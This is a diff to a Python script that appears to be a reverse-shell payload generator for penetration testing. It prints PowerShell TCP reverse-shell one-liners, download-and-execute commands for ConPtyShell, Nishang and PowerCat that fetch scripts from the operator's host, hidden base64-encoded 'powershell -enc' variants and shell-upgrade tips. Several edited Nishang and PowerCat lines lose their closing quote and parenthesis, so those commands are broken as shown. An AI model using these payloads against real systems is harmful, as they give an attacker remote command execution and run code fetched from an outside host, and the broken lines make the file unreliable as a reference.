@@ -4,16 +4,7 @@ import sys
 import subprocess
 from base64 import b64encode
 
-def pwsh_encode(ip, port):
-    text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
-    encoded = b64encode(text.encode("utf-16le")[2:]).decode()
-    return text, encoded
-
-def pwsh_down(ip, port):
-    payload = f'IEX(New-object Net.WebClient).downloadString("http://{ip}/ps.ps1")'
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
-    return payload, p64
-
+    
 
 def main():
     if len(sys.argv) < 3:
@@ -39,8 +30,16 @@ def main():
     print(f"stty raw -echo; fg")
     print(f"export TERM=xterm; reset xterm")
 
-    print("\n********** PowerShell payload b64 encode **********\n")
+    print("\n\n\n********** PowerShell payload b64 encode **********\n")
     print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")
+
+    print("\n\n\n********** Powershell reverse shell oneliner **********\n")
+    text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
+
+    encoded = b64encode(text.encode("utf-16le")[2:]).decode()
+    print(text)
+    print(f"\npowershell -nop -w hidden -enc {encoded}")
+
 
     print("\n\n\n********** ConPtyShell RevShell **********\n")
     print(f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
@@ -51,18 +50,18 @@ def main():
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** ConPtyShell Download & IEX **********\n")
-    print(f"IEX(IWR https://{ip}/Invoke-ConPtyShell.ps1 -UseBasicParsing)")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')")
 
     print("\n********** ConPtyShell Download & IEX b64 **********\n")
-    payload = "IEX(IWR https://{ip}/Invoke-ConPtyShell.ps1 -UseBasicParsing)"
+    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** ConPtyShell Download & Execution **********\n")
-    print(f"IEX(IWR https://{ip}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
 
     print("\n********** ConPtyShell Download & Execution b64 **********\n")
-    payload = "IEX(IWR https://{ip}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}" 
+    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}" 
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
@@ -78,18 +77,18 @@ def main():
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** Nishang Download & IEX **********\n")
-    print(f"IEX(IWR https://{ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing)")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1")
 
     print("\n********** Nishang Download & IEX b64 **********\n")
-    payload = "IEX(IWR https://{ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing)"
+    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** Nishang Download & Execution **********\n")
-    print(f"IEX(IWR https://{ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
 
     print("\n********** Nishang Download & Execution b64 **********\n")
-    payload = f"IEX(IWR https://{ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
@@ -104,27 +103,23 @@ def main():
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & IEX **********\n")
-    print(f"IEX(IWR https://{ip}/powercat.ps1 -UseBasicParsing)")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1")
 
     print("\n********** PowerCat Download & IEX b64 **********\n")
-    payload = "IEX(IWR https://{ip}/powercat.ps1 -UseBasicParsing)"
+    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & Execution **********\n")
-    print(f"IEX(IWR https://{ip}/powercat.ps1 -UseBasicParsing); powercat -c {ip} -p {port} -e powershell")
+    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1; powercat -c {ip} -p {port} -e powershell")
 
     print("\n********** PowerCat Download & Execution b64 **********\n")
-    payload = f"IEX(IWR https://{ip}/powercat.ps1 -UseBasicParsing); powercat -c {ip} -p {port} -e powershell"
+    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1; powercat -c {ip} -p {port} -e powershell"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
 
-    text, encoded = pwsh_encode(ip, port)
-    print("\n\n\n********** Powershell reverse shell oneliner **********\n")
-    print(text)
-    print(f"\npowershell -nop -w hidden -enc {encoded}")
-
+    
 
     print("\n\n\n********** Bash **********\n")
     bash_payloads = [
